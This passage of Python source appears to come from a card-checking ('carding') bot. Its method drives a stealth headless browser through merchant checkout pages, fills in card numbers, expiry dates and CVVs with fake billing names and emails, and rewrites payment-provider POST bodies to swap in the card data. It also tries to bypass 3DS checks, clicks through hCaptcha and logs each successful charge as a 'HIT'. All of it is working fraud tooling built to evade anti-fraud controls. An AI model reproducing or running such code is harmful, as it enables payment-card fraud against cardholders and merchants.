        if cb:
            try:
                await cb(msg)
            except Exception:
                pass

    async def _hit(self, url: str, card: Dict, merchant: str, product: str,
                   amount: str, attempt: int,
                   step_cb: Optional[StepCallback]) -> Dict:
        t0   = time.time()
        cstr = f"{card['card']}|{card['month']}|{card['year']}|{card['cvv']}"
        res: Dict = {
            "attempt": attempt, "card": card,
            "success": False, "decline_code": None,
            "receipt_url": None, "response_time": 0,
            "error": None, "screenshot": None,
        }

        await self._step(step_cb, f"🌐 Opening browser for card {attempt}…")

        try:
            async with async_playwright() as pw:
                fp   = Fingerprint.generate()
                args = ["--disable-blink-features=AutomationControlled",
                        "--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage"]
                if self.proxy:
                    args.append(f"--proxy-server={self.proxy}")

                browser = await pw.chromium.launch(headless=True, args=args)
                ctx     = await browser.new_context(
                    user_agent=fp["user_agent"], viewport=fp["viewport"],
                    locale=fp["locale"], timezone_id=fp["timezone_id"],
                    ignore_https_errors=True)
                page = await ctx.new_page()
                await page.add_init_script(Fingerprint.STEALTH)

                await self._step(step_cb, f"📡 Loading checkout page…")
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(2)

                html     = await page.content()
                provider = detect_provider(url, html)
                await self._step(step_cb, f"🔌 Provider detected: <b>{provider}</b>")

                submit_sels = GENERIC_SUBMIT_SELS

                if provider == "stripe":
                    await self._step(step_cb, f"💳 Filling Stripe card fields…")
                    await _stripe_setup(page, card)

                elif provider in PROVIDER_DOMAINS:
                    domains, extras = PROVIDER_DOMAINS[provider]

                    async def _route(route: Route, request: Request):
                        if request.method == "POST" and any(d in request.url for d in domains):
                            pd = request.post_data or ""
                            pd = pd.replace("4242424242424242", card["card"])
                            pd = pd.replace("01/30", f"{card['month']}/{card['year']}")
                            pd = pd.replace("0130", f"{card['month']}{card['year']}")
                            pd = pd.replace("123",  card["cvv"])
                            for old, tpl in extras:
                                pd = re.sub(old, tpl.format(**card), pd)
                            await route.continue_(post_data=pd); return
                        await route.continue_()

                    await page.route("**/*", _route)
                    await self._step(step_cb, f"💳 Filling card fields…")
                    await _fill(page, GENERIC_CARD_SELS, card["card"])
                    await asyncio.sleep(0.2)
                    await _fill(page, GENERIC_EXP_SELS, f"{card['month']}/{card['year']}")
                    await asyncio.sleep(0.2)
                    await _fill(page, GENERIC_CVC_SELS, card["cvv"])
                    await _fill(page, GENERIC_NAME_SELS, FAKE_BILLING["name"])
                    await _fill(page, GENERIC_EMAIL_SELS, f"nacht{random.randint(100,9999)}@gmail.com")

                else:
                    await self._step(step_cb, f"💳 Unknown provider — filling direct…")
                    await _fill(page, GENERIC_CARD_SELS, card["card"])
                    await asyncio.sleep(0.2)
                    await _fill(page, GENERIC_EXP_SELS, f"{card['month']}/{card['year']}")
                    await asyncio.sleep(0.2)
                    await _fill(page, GENERIC_CVC_SELS, card["cvv"])
                    await _fill(page, GENERIC_NAME_SELS, FAKE_BILLING["name"])
                    await _fill(page, GENERIC_EMAIL_SELS, f"nacht{random.randint(100,9999)}@gmail.com")

                await _fill_billing(page)
                await self._step(step_cb, f"📋 Billing address filled")

                await self._step(step_cb, f"🖱 Clicking submit button…")
                submitted = await _click_submit(page, submit_sels)
                if not submitted:
                    ss = await take_screenshot(page, f"submit_fail_{attempt}")
                    res.update({"decline_code": "submit_not_found",
                                "error": "Submit button not found",
                                "response_time": round(time.time()-t0,2),
                                "screenshot": ss})
                    self.fails += 1
                    await self._step(step_cb, f"❌ Submit button not found")
                    await browser.close()
                    self.results.append(res); return res

                await self._step(step_cb, f"⏳ Waiting for response…")
                await asyncio.sleep(5)

                # 3DS
                if await _wait_3ds(page, ms=10000):
                    await self._step(step_cb, f"🔐 3DS challenge detected — bypassing…")
                    await _bypass_3ds(page)
                    await asyncio.sleep(5)

                # hcaptcha
                try:
                    fl = page.frame_locator('iframe[src*="hcaptcha.com"]')
                    cb_el = fl.locator("#checkbox").first
                    if await cb_el.is_visible(timeout=2000):
                        await cb_el.click(); await asyncio.sleep(2)
                except Exception:
                    pass

                res["response_time"] = round(time.time()-t0, 2)

                # take screenshot
                ss_label = "hit" if False else "result"
                ss = await take_screenshot(page, f"card_{attempt}_{ss_label}")
                res["screenshot"] = ss

                cur_url = page.url
                body    = ""
                try:
                    body = await page.text_content("body") or ""
                except Exception:
                    pass

                success, decline_code = _check_result(cur_url, body)

                if success:
                    res.update({"success": True, "receipt_url": cur_url})
                    # retake screenshot with hit label
                    ss = await take_screenshot(page, f"card_{attempt}_HIT")
                    res["screenshot"] = ss
                    self.successes += 1
                    await self._step(step_cb, f"✅ HIT! Payment successful")
                else:
                    res["decline_code"] = decline_code or "unknown"
                    self.fails += 1
                    await self._step(step_cb, f"❌ Declined: {decline_code or 'unknown'}")

                await browser.close()

        except Exception as e:
            res.update({"error": str(e), "decline_code": "exception",
                        "response_time": round(time.time()-t0, 2)})
            self.fails += 1

        self.results.append(res)
        return res
